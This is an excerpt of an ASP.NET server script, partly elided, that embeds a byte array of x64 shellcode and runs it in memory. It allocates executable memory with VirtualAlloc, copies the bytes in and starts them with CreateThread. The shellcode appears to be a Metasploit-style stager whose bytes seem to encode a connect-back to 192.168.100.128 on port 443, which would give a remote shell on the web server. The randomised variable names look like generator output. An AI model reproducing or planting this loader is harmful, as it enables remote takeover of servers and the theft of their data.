...
<script runat="server">
    ...
    {
        byte[] bjdvGUGk = new byte[510] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x56,
...
0x48,0x01,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,
...
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x64,0x80,
...
0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
        ...
        IntPtr rqEKRFM = VirtualAlloc(IntPtr.Zero,(UIntPtr)bjdvGUGk.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bjdvGUGk,0,rqEKRFM,bjdvGUGk.Length);
        IntPtr frriuaBZ1GO = IntPtr.Zero;
        IntPtr j_9PQuIq = CreateThread(IntPtr.Zero,UIntPtr.Zero,rqEKRFM,IntPtr.Zero,0,ref frriuaBZ1GO);
    }
</script>
